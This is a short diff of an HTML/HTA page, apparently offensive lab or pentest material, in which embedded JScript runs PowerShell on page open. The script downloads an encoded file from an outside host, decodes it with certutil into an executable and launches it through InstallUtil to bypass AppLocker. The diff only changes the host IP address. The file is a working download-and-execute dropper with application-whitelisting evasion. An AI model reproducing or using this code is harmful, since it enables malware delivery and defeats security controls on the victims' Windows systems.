@@ -2,7 +2,7 @@
 	<head>
 		<script language="JScript">
 			var shell = new ActiveXObject("WScript.Shell");
-			var res = shell.Run("powershell rm C:\\Windows\\Tasks\\bar.enc; powershell rm C:\\Windows\\Tasks\\bar.exe; powershell iwr -uri http://192.168.45.224:80/evasion/ApplockerBypass/BasicApplockerRunspace/bar.enc -outfile C:\\Windows\\Tasks\\bar.enc; powershell certutil -decode C:\\Windows\\Tasks\\bar.enc C:\\Windows\\Tasks\\bar.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\bar.exe");
+			var res = shell.Run("powershell rm C:\\Windows\\Tasks\\bar.enc; powershell rm C:\\Windows\\Tasks\\bar.exe; powershell iwr -uri http://192.168.45.1:80/evasion/ApplockerBypass/BasicApplockerRunspace/bar.enc -outfile C:\\Windows\\Tasks\\bar.enc; powershell certutil -decode C:\\Windows\\Tasks\\bar.enc C:\\Windows\\Tasks\\bar.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\bar.exe");
 		</script>
 	</head>
 	<body>
